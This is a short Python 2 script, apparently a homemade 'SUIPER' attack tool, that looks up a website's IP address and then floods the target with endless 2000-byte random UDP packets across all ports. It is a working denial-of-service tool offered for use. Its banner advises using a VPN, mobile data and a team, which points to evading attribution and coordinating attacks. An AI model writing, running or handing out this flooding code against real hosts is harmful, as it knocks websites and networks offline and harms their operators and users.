import socket
import os 
import time 
import random
import sys 
os.system("clear")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)

banner = """

   _____   _    _   _____   _____    ______   _____             ______   __ 
  / ____| | |  | | |_   _| |  __ \  |  ____| |  __ \           |____  | /_ |
 | (___   | |  | |   | |   | |__) | | |__    | |__) |  ______      / /   | |
  \___ \  | |  | |   | |   |  ___/  |  __|   |  _  /  |______|    / /    | |
  ____) | | |__| |  _| |_  | |      | |____  | | \ \             / /     | |
 |_____/   \____/  |_____| |_|      |______| |_|  \_\           /_/      |_|
 _____________________________________________________________________________
AUTHOR   :THUND3RBOLT
TIPS     :Use Mobile Data,VPN,Team For Better Experience
NOTE     :You Can Take The Tool Name Seriously If You Want ;) 
_______________________________________________________________________________
"""

print '\033[01;96m' + (banner)


idk = raw_input('Enter Website Link To Get IP:')


print ('                      ')
url = "idk"


print (
'THIS Is THE IP:',socket.gethostbyname(idk))
print ('                      ')

print '\033[01;97m' + ('Copy Paste The IP To Start ;) ')
print ('                      ')
print'\033[01;95m' + ('                      ')
ip = raw_input("IP Target  : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet SUIPER Attack")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
